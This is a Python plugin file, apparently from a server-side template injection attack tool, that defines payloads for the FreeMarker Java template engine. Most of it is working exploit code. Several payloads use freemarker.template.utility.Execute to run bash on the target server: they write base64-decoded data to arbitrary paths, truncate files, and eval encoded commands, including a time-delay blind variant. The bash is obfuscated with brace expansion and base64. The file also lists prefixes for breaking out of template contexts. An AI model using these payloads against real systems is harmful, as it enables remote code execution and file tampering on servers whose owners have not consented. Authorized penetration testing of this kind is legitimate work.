from utils.strings import quote, chunkit, md5
from utils.loggers import log
from utils import rand
from plugins.languages import java
import re

class Freemarker(java.Java):
    
    def init(self):

        self.update_actions({
            'render' : {
                'render': '%(code)s',
                'header': '${%(header)s?c}',
                'trailer': '${%(trailer)s?c}',
                'test_render': """${%(r1)s}<#--%(comment)s-->${%(r2)s}""" % { 
                    'r1' : rand.randints[0],
                    'comment' : rand.randints[1],
                    'r2' : rand.randints[2]
                },
                'test_render_expected': '%(r1)s%(r2)s' % { 
                    'r1' : rand.randints[0],
                    'r2' : rand.randints[2]
                }
            },
            'write' : {
                'call' : 'inject',
                'write' : """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s") }""",
                'truncate' : """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {echo,-n,}>%(path)s") }""",
            },
            # Not using execute here since it's rendered and requires set headers and trailers
            'execute_blind' : {
                'call': 'inject',
                'execute_blind': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}") }"""
            },
            'execute' : {
                'call': 'render',
                'execute': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}") }"""
            }

        })


        self.set_contexts([


            # Text context, no closures
            { 'level': 0 },

            { 'level': 1, 'prefix': '%(closure)s}', 'suffix' : '', 'closures' : java.ctx_closures },

            # This handles <#assign s = %s> and <#if 1 == %s> and <#if %s == 1>
            { 'level': 2, 'prefix': '%(closure)s>', 'suffix' : '', 'closures' : java.ctx_closures },
            { 'level': 5, 'prefix': '-->', 'suffix' : '<#--' },
            { 'level': 5, 'prefix': '%(closure)s as a></#list><#list [1] as a>', 'suffix' : '', 'closures' : java.ctx_closures },
        ])

